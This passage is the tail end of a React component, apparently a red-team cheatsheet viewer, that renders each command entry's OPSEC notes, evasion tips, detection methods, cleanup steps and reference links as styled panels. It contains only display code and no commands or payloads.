                )}
              </div>

              {/* OPSEC Notes */}
              {cmd.opsecNotes && (
                <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-md p-2">
                  <div className="flex items-center gap-1 mb-1">
                    <Eye className="h-3 w-3 text-yellow-400" />
                    <span className="text-yellow-400 font-medium">OPSEC Notes</span>
                  </div>
                  <div className="text-zinc-300 text-xs">{cmd.opsecNotes}</div>
                </div>
              )}

              {/* Evasion Tips */}
              {cmd.evasionTips && (
                <div className="bg-cyan-500/10 border border-cyan-500/20 rounded-md p-2">
                  <div className="flex items-center gap-1 mb-1">
                    <Skull className="h-3 w-3 text-cyan-400" />
                    <span className="text-cyan-400 font-medium">Evasion Tips</span>
                  </div>
                  <div className="text-zinc-300 text-xs">{cmd.evasionTips}</div>
                </div>
              )}

              {/* Detection Methods */}
              {cmd.detectionMethods && (
                <div className="bg-orange-500/10 border border-orange-500/20 rounded-md p-2">
                  <div className="flex items-center gap-1 mb-1">
                    <Activity className="h-3 w-3 text-orange-400" />
                    <span className="text-orange-400 font-medium">Detection Methods</span>
                  </div>
                  <div className="text-zinc-300 text-xs">{cmd.detectionMethods}</div>
                </div>
              )}

              {/* Cleanup */}
              {cmd.cleanup && (
                <div className="bg-green-500/10 border border-green-500/20 rounded-md p-2">
                  <div className="flex items-center gap-1 mb-1">
                    <Trash2 className="h-3 w-3 text-green-400" />
                    <span className="text-green-400 font-medium">Cleanup</span>
                  </div>
                  <div className="text-zinc-300 text-xs">{cmd.cleanup}</div>
                </div>
              )}

              {/* References */}
              {cmd.references && cmd.references.length > 0 && (
                <div className="bg-indigo-500/10 border border-indigo-500/20 rounded-md p-2">
                  <div className="flex items-center gap-1 mb-1">
                    <ExternalLink className="h-3 w-3 text-indigo-400" />
                    <span className="text-indigo-400 font-medium">References</span>
                  </div>
                  <div className="space-y-1">
                    {cmd.references.map((ref, idx) => (
                      <a 
                        key={idx}
                        href={ref}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-xs text-indigo-300 hover:text-indigo-200 underline block"
                      >
                        {ref}
                      </a>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}
        </motion.div>
      );
    });
  }
};

export default RedTeamCheatsheetWrapper; 